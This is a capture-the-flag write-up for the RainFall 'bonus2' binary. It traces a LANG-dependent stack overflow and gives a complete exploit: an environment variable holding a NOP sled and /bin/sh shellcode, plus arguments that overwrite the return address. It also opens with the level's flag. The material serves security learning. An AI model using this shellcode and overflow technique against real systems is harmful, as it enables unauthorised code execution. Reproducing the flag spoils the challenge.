bonus2:579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

# Reconnnaissance

```shell
bonus2@RainFall:~$ ltrace ./bonus2 AAAA BBBB
__libc_start_main(0x8048529, 3, 0xbffff7e4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff6e0, "AAAA", 40)                                                                                  = 0xbffff6e0
strncpy(0xbffff708, "BBBB", 32)                                                                                  = 0xbffff708
getenv("LANG")                                                                                                   = "en_US.UTF-8"
memcmp(0xbfffff1f, 0x804873d, 2, 0xb7fff918, 0)                                                                  = -1
memcmp(0xbfffff1f, 0x8048740, 2, 0xb7fff918, 0)                                                                  = -1
strcat("Hello ", "AAAA")                                                                                         = "Hello AAAA"
puts("Hello AAAA"Hello AAAA
)                                                                                               = 11
+++ exited (status 11) +++
```
We find out that the first 40 bytes of argv[1] are copied somewhere and the first 32 bytes of arg[2] is copied just after (`0xbffff708 - 0xbffff6e0 = 0x28 = 40`)
The binary load the env variable `LANG`.

In gdb, we notice that depending on the value of `LANG`, a different string is concatenated to the buffer were both arguments have been copied.

With this:
LANG=nl
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC BBBBBBBBBBBBBBBBBBBBBBBXXXX`

We find out that we overwrite `eip` with the final `XXXX`.
Now lets find somewhere to write our shellcode.
Because the env is loaded, we can try to put the shell code in there.

# Exploit

Find the address of the env var in gdb:
```shell
(gdb) b *main +130
Breakpoint 1 at 0x80485ab
(gdb) run a a
Starting program: /home/user/bonus2/bonus2 a a

Breakpoint 1, 0x080485ab in main ()
(gdb) x $eax
0xbffffe7c:	0x90906c6e
```
address env => `0xbffffe7c` 

We put many `\x90` char, which is a `NOP` instruction (No Operation) in case the address of the env var is not exactly the same + our shell code
```shell
export LANG=nl$(echo -en "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80")

./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x9c\xfe\xff\xbf"')
```